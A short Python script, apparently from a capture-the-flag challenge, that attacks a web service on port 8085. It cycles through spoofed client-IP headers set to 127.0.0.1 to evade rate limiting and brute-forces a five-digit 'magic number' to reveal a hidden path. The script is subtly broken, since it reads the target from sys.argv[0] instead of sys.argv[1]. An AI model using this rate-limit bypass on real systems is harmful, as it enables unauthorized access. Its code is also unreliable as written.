#!/usr/bin/env python3

import requests
import re
import sys

ip_addr = sys.argv[0]

if len(sys.argv) != 2:
    print ("[!] Usage: python3 exploit.py ipaddress")
    sys.exit()

url = f"http://{ip_addr}:8085/"

def bruteforcer():
    global url
    sess = requests.session()
    with open('headers.txt', 'rb') as file:
        content = file.readlines()
        headers = [x.strip() for x in content]
    for header in headers:
        print (f"[+] Testing {header.decode()} with IP 127.0.0.1")
        for number in range(10000,99999):
            header_data = {
                    header : "127.0.0.1"
                    }
            data = {
                    "number" : number
                    }
            output = sess.post(url, headers = header_data, data = data)
            if "rate limit execeeded" in output.text:
                print (f"[-] {header.decode()} FAILED!!!\n")
                break
            elif "Oh no! How unlucky. Spin the wheel and try again" in output.text:
                pass
            else:
                print (f"[+] {header.decode()} SUCCESS\n[+] Your magic number is {number}")
                path = re.search("<h3>(.*?)</h3", output.text, re.DOTALL).group(1)
                print (path)
                sys.exit()

if __name__ == ("__main__"):
    bruteforcer()
